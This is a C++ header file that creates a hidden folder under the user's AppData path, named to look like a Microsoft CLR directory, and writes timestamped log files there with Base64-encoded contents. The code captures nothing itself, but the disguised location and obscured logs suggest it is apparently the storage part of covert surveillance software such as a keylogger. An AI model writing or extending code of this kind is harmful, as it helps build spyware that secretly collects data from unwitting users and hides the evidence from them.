#pragma once

#include<string>
#include<cstdlib>
#include<windows.h>
#include<fstream>
#include"Helper.h"
#include"Base64.h"

namespace IO{
    std::string GetOurPath(const bool append_separator = false){
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";

        return full + (append_separator ? "\\" : "");
    }

    inline bool MkOneDr(std::string path){
        return (bool)CreateDirectory(path.c_str(), nullptr) || (GetLastError() == ERROR_ALREADY_EXISTS);
    }

    bool MKDir(std::string path){
        for(char &c : path)
        if(c == '\\'){
            c = '\0';
            if(!MkOneDr(path))
                return false;
            c = '\\';
        }
        return true;
    }

    template <typename T>
    std::string WriteLog(const T &t){
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";

        try{
            std::ofstream file(path + name);
            if(!file) return "";
            std::stringstream s;
            s << "[" << dt.GetDateTimeString() << "]" << std::endl << t <<std::endl;
            std::string data = Base64::EncryptB64(s.str());
            file << data;
            if(!file) return "";
            file.close();
            return name;
        }catch(...){ return ""; }
    }
}
